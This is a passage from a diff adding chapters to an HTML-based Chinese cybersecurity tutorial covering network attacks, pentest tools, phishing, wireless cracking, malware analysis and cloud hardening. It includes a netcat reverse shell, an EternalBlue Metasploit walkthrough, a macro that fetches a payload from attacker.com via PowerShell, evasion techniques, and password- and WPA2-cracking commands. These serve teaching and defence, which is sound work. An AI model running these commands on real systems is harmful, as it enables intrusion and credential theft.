+openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem</code></pre>
+
+        <h3>9.6 常见密码学攻击</h3>
+        <ul>
+          <li>
+            <strong>暴力破解</strong>：穷举所有可能密钥，防御用长密钥和限速
+          </li>
+          <li><strong>彩虹表</strong>：预计算哈希表，防御加盐（Salt）</li>
+          <li>
+            <strong>中间人攻击（MITM）</strong>：SSL Strip、伪造证书，防御 HSTS
+            + 证书固定
+          </li>
+          <li>
+            <strong>Padding Oracle</strong>：利用解密错误信息差异，防御使用
+            AES-GCM
+          </li>
+          <li><strong>重放攻击</strong>：截获并重发请求，防御时间戳+Nonce</li>
+          <li>
+            <strong>撞库</strong>：用泄露的账号密码批量尝试登录，防御 MFA +
+            异常检测
+          </li>
+        </ul>
+      </section>
+
+      <!-- ==================== 第十章 ==================== -->
+      <section class="section" id="ch10">
+        <h2><span class="num">10</span> 网络攻击与防御</h2>
+
+        <h3>10.1 DoS / DDoS 攻击</h3>
+        <p>
+          拒绝服务攻击通过耗尽目标资源使其无法正常服务。DDoS
+          是分布式版本，利用大量傀儡机同时攻击。
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>层次</th>
+              <th>攻击类型</th>
+              <th>原理</th>
+              <th>防御</th>
+            </tr>
+            <tr>
+              <td>网络层</td>
+              <td>SYN Flood</td>
+              <td>发送大量 SYN 不完成握手</td>
+              <td>SYN Cookies、连接数限制</td>
+            </tr>
+            <tr>
+              <td>网络层</td>
+              <td>UDP Flood</td>
+              <td>大量 UDP 包占满带宽</td>
+              <td>带宽清洗、ACL</td>
+            </tr>
+            <tr>
+              <td>网络层</td>
+              <td>ICMP Flood (Smurf)</td>
+              <td>大量 ping 包</td>
+              <td>禁止 ICMP、限速</td>
+            </tr>
+            <tr>
+              <td>放大攻击</td>
+              <td>DNS/NTP/Memcached</td>
+              <td>伪造源 IP，利用小请求获得大响应</td>
+              <td>关闭开放递归、源认证</td>
+            </tr>
+            <tr>
+              <td>应用层</td>
+              <td>HTTP Flood (CC)</td>
+              <td>大量合法 HTTP 请求</td>
+              <td>WAF、验证码、频率限制</td>
+            </tr>
+            <tr>
+              <td>应用层</td>
+              <td>Slowloris</td>
+              <td>慢速发送占满连接池</td>
+              <td>超时设置、反向代理</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>10.2 中间人攻击（MITM）</h3>
+        <pre><code># 常见 MITM 技术
+# 1. ARP 欺骗（局域网）
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+# 2. DNS 欺骗
+dnsspoof -i eth0 -f hosts
+
+# 3. SSL Strip（降级 HTTPS → HTTP）
+sslstrip -l 8080
+
+# 4. Evil Twin（伪造 Wi-Fi 热点）
+hostapd-wpe
+
+# 防御
+# 1. 全链路 HTTPS + HSTS
+# 2. 证书固定（Certificate Pinning）
+# 3. 静态 ARP / 802.1X
+# 4. DNSSEC
+# 5. VPN 加密所有流量</code></pre>
+
+        <h3>10.3 防火墙与 IDS/IPS</h3>
+
+        <h4>防火墙类型</h4>
+        <ul>
+          <li><strong>包过滤防火墙</strong>：基于 IP/端口/协议（iptables）</li>
+          <li><strong>状态检测防火墙</strong>：跟踪连接状态</li>
+          <li>
+            <strong>应用层防火墙（WAF）</strong>：检测 HTTP
+            内容（ModSecurity、Cloudflare）
+          </li>
+          <li>
+            <strong>下一代防火墙（NGFW）</strong>：集成应用识别、IPS、威胁情报
+          </li>
+        </ul>
+
+        <pre><code># iptables 基础
+iptables -L -n -v                  # 查看规则
+iptables -P INPUT DROP             # 默认拒绝入站
+iptables -A INPUT -i lo -j ACCEPT  # 允许回环
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+
+# iptables 持久化
+iptables-save > /etc/iptables/rules.v4
+
+# UFW（Ubuntu 简化前端）
+ufw default deny incoming
+ufw default allow outgoing
+ufw allow 22/tcp
+ufw enable
+
+# nftables（iptables 继任者）
+nft list ruleset</code></pre>
+
+        <h4>IDS / IPS</h4>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>类型</th>
+              <th>部署方式</th>
+              <th>特点</th>
+              <th>工具</th>
+            </tr>
+            <tr>
+              <td>NIDS</td>
+              <td>网络镜像/旁路</td>
+              <td>监控全网流量</td>
+              <td>Snort、Suricata、Zeek</td>
+            </tr>
+            <tr>
+              <td>HIDS</td>
+              <td>主机端 Agent</td>
+              <td>监控主机行为</td>
+              <td>OSSEC、Wazuh、Osquery</td>
+            </tr>
+            <tr>
+              <td>NIPS</td>
+              <td>网络串联</td>
+              <td>实时阻断攻击</td>
+              <td>Snort inline、Suricata</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>10.4 VPN 与网络隔离</h3>
+        <pre><code># VPN 类型对比
+# IPsec    — 网络层 VPN，站点到站点，企业常用
+# OpenVPN  — SSL VPN，跨平台，开源
+# WireGuard— 现代 VPN，代码精简，高性能（推荐）
+# L2TP/PPTP— 老旧协议，不安全
+
+# WireGuard 服务端配置示例 (/etc/wireguard/wg0.conf)
+[Interface]
+PrivateKey = &lt;server_private_key&gt;
+Address = 10.0.0.1/24
+ListenPort = 51820
+PostUp = iptables -A FORWARD -i wg0 -j ACCEPT
+PostDown = iptables -D FORWARD -i wg0 -j ACCEPT
+
+[Peer]
+PublicKey = &lt;client_public_key&gt;
+AllowedIPs = 10.0.0.2/32
+
+# 网络分区原则
+# DMZ（隔离区）：Web 服务器、邮件服务器
+# 内网：应用服务器、数据库
+# 管理区：运维跳板机、监控系统
+# 各区域间通过防火墙策略严格控制访问</code></pre>
+
+        <h3>10.5 网络欺骗与防御</h3>
+        <ul>
+          <li>
+            <strong>MAC 泛洪</strong>：填满交换机 CAM
+            表使其变成集线器，防御端口安全
+          </li>
+          <li>
+            <strong>VLAN 跳跃</strong>：利用 DTP 协议或双重标签跨 VLAN，防御关闭
+            DTP、指定 Trunk
+          </li>
+          <li>
+            <strong>DHCP 欺骗</strong>：伪造 DHCP 服务器推送恶意 DNS，防御 DHCP
+            Snooping
+          </li>
+          <li>
+            <strong>STP 攻击</strong>：伪造 BPDU 成为根桥，防御 BPDU Guard、Root
+            Guard
+          </li>
+        </ul>
+      </section>
+
+      <!-- ==================== 第十一章 ==================== -->
+      <section class="section" id="ch11">
+        <h2><span class="num">11</span> 渗透测试工具集</h2>
+
+        <h3>11.1 Kali Linux 概览</h3>
+        <p>
+          Kali Linux 是基于 Debian 的渗透测试专用发行版，预装 600+ 安全工具。
+        </p>
+        <pre><code># 常用工具分类
+# 信息收集：nmap、masscan、amass、subfinder
+# Web 渗透：burpsuite、sqlmap、nikto、dirb、gobuster
+# 密码攻击：hashcat、john、hydra、crunch
+# 漏洞利用：metasploit、searchsploit
+# 无线攻击：aircrack-ng、wifite、reaver
+# 逆向工程：ghidra、radare2、gdb
+# 取证：autopsy、volatility、binwalk
+# 社会工程：set（Social-Engineer Toolkit）
+
+# Kali WSL 安装
+wsl --install -d kali-linux
+
+# 工具更新
+sudo apt update && sudo apt full-upgrade -y
+sudo apt install kali-linux-large</code></pre>
+
+        <h3>11.2 Metasploit Framework</h3>
+        <pre><code># 启动
+msfconsole
+
+# 基础搜索
+search type:exploit platform:windows ms17
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+
+# 模块类型
+# exploit — 利用漏洞执行 payload
+# payload — 攻击载荷（shellcode）
+# auxiliary — 辅助模块（扫描、嗅探、暴力破解）
+# post — 后渗透模块
+# encoder — 编码绕过
+
+# 典型攻击流程
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > set RHOSTS 192.168.1.100
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 192.168.1.10
+msf6 > set LPORT 4444
+msf6 > check
+msf6 > exploit
+
+# Meterpreter 常用命令
+sysinfo          # 系统信息
+getuid           # 当前用户
+getsystem        # 尝试提权
+hashdump         # 导出密码 Hash
+screenshot       # 截屏
+webcam_snap      # 摄像头拍照
+shell            # 进入系统 Shell
+background       # 后台会话
+migrate PID      # 迁移进程
+load kiwi        # 加载 Mimikatz
+ps               # 进程列表</code></pre>
+
+        <h3>11.3 Burp Suite</h3>
+        <p>
+          Burp Suite 是 Web
+          渗透测试最重要的工具，分为社区版（免费）和专业版（付费）。
+        </p>
+
+        <h4>核心模块</h4>
+        <ul>
+          <li>
+            <strong>Proxy</strong>：拦截和修改 HTTP/HTTPS 请求（浏览器代理
+            127.0.0.1:8080）
+          </li>
+          <li><strong>Repeater</strong>：手动重放修改请求，最常用模块</li>
+          <li>
+            <strong>Intruder</strong>：自动化爆破（Sniper/Battering
+            ram/Pitchfork/Cluster bomb）
+          </li>
+          <li><strong>Scanner</strong>：自动化漏洞扫描（Pro 版）</li>
+          <li><strong>Decoder</strong>：编码解码（URL/Base64/HTML/Hex）</li>
+          <li><strong>Comparer</strong>：对比响应差异</li>
+          <li><strong>Sequencer</strong>：分析 Token 随机性</li>
+        </ul>
+
+        <pre><code># HTTPS 抓包配置
+# 1. 浏览器代理设为 127.0.0.1:8080
+# 2. 访问 http://burp 下载 CA 证书
+# 3. 浏览器导入证书（受信任的根证书颁发机构）
+# 4. Firefox：about:preferences → 隐私与安全 → 证书 → 查看证书 → 导入
+
+# 常用插件（BApp Store）
+# Logger++ — 增强日志
+# Param Miner — 参数挖掘
+# Active Scan++ — 增强扫描
+# Autorize — 自动化越权测试
+# JSON Web Token — JWT 调试
+# Wsdler — WSDL 解析</code></pre>
+
+        <h3>11.4 密码破解工具</h3>
+        <pre><code># Hydra — 在线密码爆破
+hydra -l admin -P rockyou.txt 192.168.1.100 ssh
+hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form \
+  "/login:user=^USER^&pass=^PASS^:Invalid"
+hydra -l admin -P pass.txt ftp://192.168.1.100
+
+# John the Ripper — 离线 Hash 破解
+john --wordlist=rockyou.txt hash.txt
+john --format=Raw-MD5 hash.txt
+john --show hash.txt
+unshadow /etc/passwd /etc/shadow > hashes.txt
+
+# Hashcat — GPU 加速破解
+hashcat -m 0 hash.txt rockyou.txt          # MD5
+hashcat -m 100 hash.txt rockyou.txt        # SHA1
+hashcat -m 1400 hash.txt rockyou.txt       # SHA256
+hashcat -m 1800 shadow.txt rockyou.txt     # Linux shadow
+hashcat -m 2500 capture.hccapx rockyou.txt # WPA2
+hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d    # 6 位数字掩码
+
+# Crunch — 生成字典
+crunch 6 6 0123456789 -o num6.txt
+crunch 8 8 -t admin%%% -o admin.txt        # % 数字 @ 小写字母 , 大写</code></pre>
+
+        <h3>11.5 其他常用工具</h3>
+        <pre><code># SearchSploit — Exploit-DB 离线搜索
+searchsploit apache 2.4
+searchsploit -m 42934    # 复制 exploit 到当前目录
+
+# Netcat — 网络瑞士军刀
+nc -lvnp 4444            # 监听端口
+nc 192.168.1.100 4444    # 连接
+nc -e /bin/bash 10.0.0.1 4444  # 反弹 Shell
+
+# Socat — 加强版 Netcat
+socat TCP-LISTEN:4444,fork EXEC:/bin/bash
+
+# PowerShell Empire / Covenant — C2 框架
+# Cobalt Strike — 商业红队 C2（行业标杆）
+
+# Responder — LLMNR/NBT-NS 毒化（获取 Net-NTLM Hash）
+responder -I eth0
+
+# Impacket — Python 网络工具集
+python3 secretsdump.py domain/admin:password@10.0.0.1
+python3 psexec.py domain/admin:password@10.0.0.1
+python3 wmiexec.py admin:password@10.0.0.1</code></pre>
+      </section>
+
+      <!-- ==================== 第十二章 ==================== -->
+      <section class="section" id="ch12">
+        <h2><span class="num">12</span> 社会工程学与物理安全</h2>
+
+        <h3>12.1 社会工程学概述</h3>
+        <p>
+          社会工程学（Social
+          Engineering）利用人性弱点（信任、恐惧、好奇、贪婪、紧迫）而非技术漏洞获取信息或访问权限。在实际攻防中，社工往往是最有效的攻击路径。
+        </p>
+
+        <h3>12.2 常见社工攻击类型</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>类型</th>
+              <th>手段</th>
+              <th>目标</th>
+            </tr>
+            <tr>
+              <td>钓鱼邮件</td>
+              <td>伪造可信邮件，诱导点击链接或打开附件</td>
+              <td>凭证窃取、木马投递</td>
+            </tr>
+            <tr>
+              <td>鱼叉式钓鱼</td>
+              <td>针对特定人员定制邮件</td>
+              <td>高管、运维、财务</td>
+            </tr>
+            <tr>
+              <td>鲸钓</td>
+              <td>专盯 CEO/CFO 等高管</td>
+              <td>商业欺诈（BEC）</td>
+            </tr>
+            <tr>
+              <td>短信钓鱼 (Smishing)</td>
+              <td>伪造短信链接</td>
+              <td>移动端凭证窃取</td>
+            </tr>
+            <tr>
+              <td>语音钓鱼 (Vishing)</td>
+              <td>冒充 IT/银行/政府电话</td>
+              <td>密码、转账</td>
+            </tr>
+            <tr>
+              <td>钓鱼 Wi-Fi</td>
+              <td>伪造免费热点</td>
+              <td>流量劫持、凭证窃取</td>
+            </tr>
+            <tr>
+              <td>物理尾随</td>
+              <td>跟随员工进入门禁</td>
+              <td>物理入侵</td>
+            </tr>
+            <tr>
+              <td>诱饵投放</td>
+              <td>丢弃感染 U 盘</td>
+              <td>木马植入内网</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>12.3 钓鱼攻击技术</h3>
+        <pre><code># 钓鱼邮件特征
+# - 发件人域名与官方高度相似（paypa1.com vs paypal.com）
+# - 显示名伪造（显示 "IT Support" 但实际地址是 attacker@evil.com）
+# - 紧迫感："您的账户将在 24 小时内冻结"
+# - 链接显示文本与实际 URL 不符
+# - 附件为 .exe / .docm / .hta / .iso / .zip
+# - 语法错误或不自然的表达
+
+# Gophish — 开源钓鱼演练平台
+# 1. 搭建钓鱼页面（克隆登录页）
+# 2. 导入目标邮箱列表
+# 3. 发送钓鱼邮件模板
+# 4. 统计点击率和凭证提交率
+
+# SET（Social-Engineer Toolkit）
+setoolkit
+# 选项 1：Social-Engineering Attacks
+# 选项 2：Website Attack Vectors
+# 选项 3：Credential Harvester Attack Method</code></pre>
+
+        <h3>12.4 恶意文件与免杀</h3>
+        <pre><code># 常见恶意文件格式
+# Office 宏：.docm / .xlsm（VBA 宏代码）
+# HTML 走私：.hta / .html（CHM、IE 漏洞）
+# 快捷方式：.lnk（执行隐藏命令）
+# ISO/IMG：绕过 Mark-of-the-Web
+# 脚本：.vbs / .js / .ps1 / .bat
+
+# 宏代码示例（仅用于授权测试）
+Sub AutoOpen()
+  Dim cmd As String
+  cmd = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"
+  Shell cmd, vbHide
+End Sub
+
+# 免杀技术（AV/EDR 绕过）
+# 1. 代码混淆：变量名随机化、字符串加密、控制流平坦化
+# 2. 分离加载：Loader 远程加载加密 Shellcode
+# 3. 白名单利用：利用签名程序执行（Msbuild、mshta、rundll32）
+# 4. 直接系统调用：绕过 Hook
+# 5. 内存加密：运行时解密 Shellcode
+# 6. 延迟执行：Sleep / 计划任务 / 注册表启动项</code></pre>
+
+        <h3>12.5 物理安全</h3>
+        <ul>
+          <li>
+            <strong>门禁系统</strong>：刷卡 +
+            生物识别双因素，防尾随（防尾随门/保安值守）
+          </li>
+          <li><strong>监控系统</strong>：关键区域全覆盖，录像保留 ≥ 90 天</li>
+          <li>
+            <strong>设备安全</strong>：BIOS
+            密码、磁盘加密（BitLocker/LUKS）、USB 端口管控
+          </li>
+          <li><strong>访客管理</strong>：登记、陪同、临时卡、网络隔离</li>
+          <li><strong>介质管理</strong>：U 盘登记审批，报废介质物理销毁</li>
+          <li><strong>文档安全</strong>：桌面清空政策（Clean Desk），碎纸机</li>
+          <li><strong>办公环境</strong>：防窥膜、会议白板擦除、打印机安全</li>
+        </ul>
+
+        <h3>12.6 反社工防御</h3>
+        <ul>
+          <li><strong>安全意识培训</strong>：定期钓鱼演练，全员参与</li>
+          <li>
+            <strong>验证机制</strong>：电话回拨已知号码确认身份，不通过来电显示
+          </li>
+          <li>
+            <strong>邮件安全网关</strong>：SPF/DKIM/DMARC、附件沙箱、URL 重写
+          </li>
+          <li><strong>MFA</strong>：即使密码泄露，攻击者也无法登录</li>
+          <li><strong>最小权限</strong>：每个员工只能访问必要的信息和系统</li>
+          <li><strong>报告机制</strong>：简单的可疑邮件举报按钮，鼓励上报</li>
+        </ul>
+      </section>
+
+      <!-- ==================== 第十三章 ==================== -->
+      <section class="section" id="ch13">
+        <h2><span class="num">13</span> 无线网络安全</h2>
+
+        <h3>13.1 无线加密协议演进</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>协议</th>
+              <th>状态</th>
+              <th>问题</th>
+            </tr>
+            <tr>
+              <td>WEP</td>
+              <td>已废弃（2004）</td>
+              <td>RC4 弱密钥，几分钟可破解</td>
+            </tr>
+            <tr>
+              <td>WPA</td>
+              <td>已废弃</td>
+              <td>TKIP 仍有漏洞</td>
+            </tr>
+            <tr>
+              <td>WPA2-PSK</td>
+              <td>广泛使用</td>
+              <td>KRACK 攻击、离线字典破解</td>
+            </tr>
+            <tr>
+              <td>WPA2-Enterprise</td>
+              <td>企业推荐</td>
+              <td>802.1X + RADIUS，每用户独立凭证</td>
+            </tr>
+            <tr>
+              <td>WPA3</td>
+              <td>最新标准</td>
+              <td>SAE 替代 PSK，防离线字典，前向保密</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>13.2 WPA2-PSK 破解</h3>
+        <pre><code># 攻击流程（需在授权环境测试）
+# 1. 网卡设为监听模式
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+# 2. 抓取 WPA2 握手包
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# 3. 发送 Deauth 强制重连（获取握手包）
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan0mon
+
+# 4. 字典破解
+aircrack-ng -w rockyou.txt capture-01.cap
+# 或使用 hashcat（更快）
+hcxpcapngtool capture-01.cap -o capture.hc22000
+hashcat -m 22000 capture.hc22000 rockyou.txt</code></pre>
+
+        <h3>13.3 WPA3 与企业无线</h3>
+        <ul>
+          <li>
+            <strong>WPA3-SAE</strong>：使用 Dragonfly 握手，防离线字典攻击和
+            KRACK
+          </li>
+          <li>
+            <strong>WPA3-Enterprise 192-bit</strong>：NSA Suite B
+            密码套件，最高安全等级
+          </li>
+          <li>
+            <strong>EAP-TLS</strong>：客户端证书认证，安全性最高（防 Evil Twin）
+          </li>
+          <li>
+            <strong>PEAP/MSCHAPv2</strong>：用户名密码认证，广泛兼容，需防虚假
+            AP
+          </li>
+        </ul>
+
+        <h3>13.4 无线攻击面</h3>
+        <pre><code># Evil Twin（伪造 AP）
+# 使用 hostapd-mana 或 wifiphisher
+wifiphisher -i wlan0 --essid "Free Public WiFi"
+
+# Karma 攻击：响应所有 Probe Request
+# 设备会自动连接曾保存过的网络名称
+
+# 蓝牙攻击
+hciconfig                    # 查看蓝牙适配器
+hcitool scan                 # 扫描蓝牙设备
+bluesnarfer                  # 蓝牙信息窃取
+# BlueBorne（CVE-2017-0785）：蓝牙 RCE
+
+# RFID/NFC 攻击
+# Proxmark3：RFID 复制、克隆、重放
+# Mifare Classic 卡密钥可破解（mfoc/mfcuk）</code></pre>
+
+        <h3>13.5 无线网络加固</h3>
+        <ul>
+          <li>使用 WPA3 或 WPA2-Enterprise（禁用 WEP/WPA/TKIP）</li>
+          <li>使用强密码（≥16 位随机字符），定期更换</li>
+          <li>禁用 WPS（PIN 码可暴力破解）</li>
+          <li>修改默认管理密码和 SSID（不使用公司名）</li>
+          <li>启用 802.1X 认证和动态 VLAN 分配</li>
+          <li>无线客户端隔离（Client Isolation）</li>
+          <li>部署无线 IDS/IPS（WIDS/WIPS）检测 Rogue AP 和 Evil Twin</li>
+          <li>访客网络与办公网络隔离，限速并定期改密</li>
+        </ul>
+      </section>
+
+      <!-- ==================== 第十四章 ==================== -->
+      <section class="section" id="ch14">
+        <h2><span class="num">14</span> 逆向工程与恶意代码分析</h2>
+
+        <h3>14.1 逆向工程基础</h3>
+        <p>
+          逆向工程（Reverse
+          Engineering）是分析二进制程序以理解其功能、逻辑和算法的过程。在安全领域用于漏洞挖掘、恶意代码分析和软件保护研究。
+        </p>
+
+        <h3>14.2 汇编基础（x86/x64）</h3>
+        <pre><code># 寄存器（x64）
+# RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP
+# R8-R15
+# EAX = RAX 低 32 位，AX = RAX 低 16 位
+
+# 函数调用约定（x64 Windows）
+# RCX, RDX, R8, R9 — 前 4 个参数
+# RAX — 返回值
+# RSP — 栈指针
+# 由调用者分配 32 字节影子空间
+
+# 常见指令
+mov rax, rbx        # 赋值
+push/pop            # 栈操作
+call/ret            # 函数调用/返回
+add/sub/imul        # 算术
+cmp/jmp/jne/je/jz   # 比较与跳转
+lea rax, [rbx+rcx]  # 计算地址
+
+# 函数栈帧
+push rbp
+mov  rbp, rsp
+sub  rsp, 0x20      # 局部变量
+...
+leave               # mov rsp,rbp; pop rbp
+ret</code></pre>
+
+        <h3>14.3 逆向工具</h3>
+        <pre><code># 静态分析（不运行程序）
+# Ghidra — NSA 开源反编译器，功能强大
+# IDA Pro — 行业标准，Hex-Rays 反编译器
+# Radare2/Cutter — 开源命令行/图形化
+# Binary Ninja — 现代化逆向平台
+
+# 动态分析（运行时调试）
+# x64dbg — Windows 开源调试器
+# GDB + pwndbg/gef — Linux 调试器
+# WinDbg — Windows 内核调试
+# Frida — 动态插桩框架
+
+# 其他
+# PEiD/DIE — 查壳/编译器识别
+# UPX — 通用脱壳（upx -d）
+# strings — 提取可打印字符串
+# binwalk — 固件分析
+# 010 Editor — 十六进制编辑器</code></pre>
+
+        <h3>14.4 恶意代码分析流程</h3>
+        <ol>
+          <li>
+            <strong>静态分析</strong>：查壳 → strings → 导入表 → 反编译阅读逻辑
+          </li>
+          <li>
+            <strong>动态分析</strong>：沙箱运行 → 监控文件/注册表/网络行为 →
+            调试器跟踪
+          </li>
+          <li>
+            <strong>行为分析</strong>：持久化方式、C2 通信、横向移动、反沙箱技术
+          </li>
+          <li>
+            <strong>IOC 提取</strong>：MD5/SHA256、C2
+            域名/IP、互斥量、注册表键值
+          </li>
+          <li>
+            <strong>报告输出</strong>：攻击链、TTP（对应 MITRE
+            ATT&amp;CK）、检测规则
+          </li>
+        </ol>
+
+        <h3>14.5 恶意代码类型</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>类型</th>
+              <th>特征</th>
+              <th>典型案例</th>
+            </tr>
+            <tr>
+              <td>病毒 (Virus)</td>
+              <td>感染宿主文件，需宿主运行</td>
+              <td>CIH、熊猫烧香</td>
+            </tr>
+            <tr>
+              <td>蠕虫 (Worm)</td>
+              <td>自我复制，主动传播</td>
+              <td>Conficker、WannaCry</td>
+            </tr>
+            <tr>
+              <td>木马 (Trojan)</td>
+              <td>伪装正常软件</td>
+              <td>远程控制木马（RAT）</td>
+            </tr>
+            <tr>
+              <td>勒索软件</td>
+              <td>加密文件索要赎金</td>
+              <td>WannaCry、LockBit、BlackCat</td>
+            </tr>
+            <tr>
+              <td>间谍软件</td>
+              <td>窃取信息</td>
+              <td>Pegasus、FinFisher</td>
+            </tr>
+            <tr>
+              <td>Rootkit</td>
+              <td>内核级隐藏</td>
+              <td>ZeroAccess、Sony DRM</td>
+            </tr>
+            <tr>
+              <td>挖矿木马</td>
+              <td>劫持算力挖矿</td>
+              <td>WannaMine、Coinminer</td>
+            </tr>
+            <tr>
+              <td>无文件恶意软件</td>
+              <td>仅存在于内存/注册表</td>
+              <td>PowerShell 攻击、Cobalt Strike Beacon</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>14.6 沙箱与动态分析环境</h3>
+        <pre><code># 在线沙箱（上传样本自动分析）
+# ANY.RUN、Joe Sandbox、Hybrid Analysis
+# VirusTotal — 多引擎扫描（注意敏感样本不要上传公开沙箱）
+# CapeSandbox、Cuckoo Sandbox（自建开源）
+
+# 进程监控工具
+# Process Monitor（ProcMon）— 文件/注册表/网络实时监控
+# Process Explorer — 进程树和句柄查看
+# API Monitor — API 调用监控
+# Wireshark — 网络抓包
+
+# 反沙箱/反调试技术
+# - 检测 CPU 核心数、内存大小（沙箱通常资源少）
+# - 检测鼠标移动、用户交互
+# - Sleep 延迟执行（沙箱可能加速）
+# - 检测虚拟机特征（VMware Tools、虚拟 MAC）
+# - IsDebuggerPresent、NtGlobalFlag、时间差检测
+# - 检测分析工具进程（Wireshark、x64dbg、ProcMon）</code></pre>
+      </section>
+
+      <!-- ==================== 第十五章 ==================== -->
+      <section class="section" id="ch15">
+        <h2><span class="num">15</span> 云安全与容器安全</h2>
+
+        <h3>15.1 云计算服务模型</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>模型</th>
+              <th>全称</th>
+              <th>客户管理</th>
+              <th>云厂商管理</th>
+            </tr>
+            <tr>
+              <td>IaaS</td>
+              <td>基础设施即服务</td>
+              <td>OS、中间件、应用、数据</td>
+              <td>虚拟化、网络、存储、硬件</td>
+            </tr>
+            <tr>
+              <td>PaaS</td>
+              <td>平台即服务</td>
+              <td>应用、数据</td>
+              <td>OS、运行时、中间件</td>
+            </tr>
+            <tr>
+              <td>SaaS</td>
+              <td>软件即服务</td>
+              <td>数据、用户配置</td>
+              <td>应用、OS、基础设施</td>
+            </tr>
+            <tr>
+              <td>FaaS</td>
+              <td>函数即服务</td>
+              <td>函数代码、配置</td>
+              <td>全部底层（Serverless）</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>15.2 云安全责任共担模型</h3>
+        <p>
+          云安全的核心原则：<strong
+            >云厂商负责云的安全（Security of the
+            Cloud），客户负责云中的安全（Security in the Cloud）</strong
+          >。
+        </p>
+        <ul>
+          <li>IaaS：客户责任最重（补丁、配置、防火墙、数据加密）</li>
+          <li>SaaS：客户主要负责数据分类和访问控制</li>
+          <li>常见误解："上了云就安全了"——错误，配置错误是云上最大风险</li>
+        </ul>
+
+        <h3>15.3 云配置错误（Top Risk）</h3>
+        <pre><code># AWS 常见安全问题
+# 1. S3 存储桶公开
+aws s3api get-bucket-acl --bucket my-bucket
+aws s3 ls s3://my-bucket --no-sign-request  # 未授权访问测试
+
+# 2. IAM 过度授权
+# ❌ AdministratorAccess 给普通用户
+# ✅ 最小权限策略
+
+# 3. 安全组 0.0.0.0/0 开放
+aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values=0.0.0.0/0
+
+# 4. Access Key 泄露（GitHub）
+# 使用 git-secrets、truffleHog 扫描
+# 立即轮换泄露的 Key
+
+# 5. RDS/数据库公网暴露
+# 应放在私有子网，通过安全组限制访问
+
+# 云安全态势管理（CSPM）
+# 工具：Prowler、ScoutSuite、CloudSploit、Trivy
+prowler aws
+scout aws</code></pre>
+
+        <h3>15.4 容器安全（Docker）</h3>
+        <pre><code># Docker 安全风险
+# 1. 以 root 运行容器（容器逃逸 → 宿主机 root）
+# 2. 特权模式 --privileged（完全访问宿主机设备）
+# 3. 挂载宿主机敏感目录 -v /:/host
+# 4. 使用不可信镜像（镜像中包含后门）
+# 5. Docker Daemon 暴露 2375 端口（无认证）
+# 6. 容器镜像包含敏感信息（环境变量、密钥）
+
+# Docker 加固
+# 1. 使用非 root 用户
+docker run --user 1000:1000 myapp
+
+# 2. 只读根文件系统
+docker run --read-only myapp
+
+# 3. 限制能力（Capability）
+docker run --cap-drop all --cap-add NET_BIND_SERVICE myapp
+
+# 4. 资源限制
+docker run --memory=512m --cpus=1 myapp
+
+# 5. 安全选项
+docker run --security-opt no-new-privileges myapp
+docker run --security-opt seccomp=seccomp.json myapp
+
+# 6. 镜像扫描
+trivy image myapp:latest
+docker scan myapp:latest
+grype myapp:latest</code></pre>
+
+        <h3>15.5 Kubernetes 安全</h3>
+        <pre><code># K8s 安全配置
+# 1. RBAC（基于角色的访问控制）
+kubectl create role pod-reader --verb=get,list,watch --resource=pods
+kubectl create rolebinding bob-role --role=pod-reader --user=bob
+
+# 2. Pod 安全标准（PSS）
+# privileged → baseline → restricted（最严格）
+# 在 namespace 设置
+kubectl label namespace myns pod-security.kubernetes.io/enforce=restricted
+
+# 3. NetworkPolicy（网络隔离）
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-all
+spec:
+  podSelector: {}
+  policyTypes: [Ingress, Egress]
+
+# 4. Secret 加密（不使用明文）
+# 使用 Sealed Secrets、Vault、云 KMS
+
+# K8s 安全扫描
+kube-bench run          # CIS Benchmark
+trivy k8s cluster       # 集群安全扫描
+kubesec scan pod.yaml   # 工作负载安全评分</code></pre>
+
+        <h3>15.6 DevSecOps</h3>
+        <p>
+          DevSecOps 将安全融入 CI/CD
+          流水线，实现"安全左移"——在开发早期发现和修复问题。
+        </p>
+        <pre><code># CI/CD 安全检查流水线
+# 1. 代码提交 → 密钥扫描（gitleaks/truffleHog）
+# 2. 依赖检查 → SCA（Dependabot/Snyk/Trivy）
+# 3. 静态分析 → SAST（SonarQube/Semgrep/CodeQL）
+# 4. 镜像构建 → 镜像扫描（Trivy/Grype）
+# 5. 部署前 → 配置检查（kube-bench/Checkov）
+# 6. 运行时 → 容器运行时保护（Falco）
+
+# GitHub Actions 示例
+- name: Run Trivy
+  run: trivy image --severity CRITICAL myapp:${{ github.sha }}
+
+- name: Run Semgrep
+  run: semgrep --config=p/security-audit --config=p/owasp-top-ten .</code></pre>
+      </section>
+
+      <!-- ==================== 第十六章 ==================== -->
+      <section class="section" id="ch16">
+        <h2><span class="num">16</span> 应急响应与数字取证</h2>
+
